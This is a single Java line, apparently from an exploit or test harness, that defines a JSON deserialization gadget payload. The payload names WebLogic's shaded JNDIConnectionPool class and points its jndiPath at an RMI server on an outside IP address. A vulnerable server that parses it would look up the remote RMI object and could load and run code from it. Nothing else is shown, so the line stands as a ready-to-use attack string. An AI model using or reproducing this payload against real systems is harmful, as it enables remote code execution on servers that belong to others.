String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"rmi://47.94.236.117:1099/gtaafz\"}]";  
  
  
  
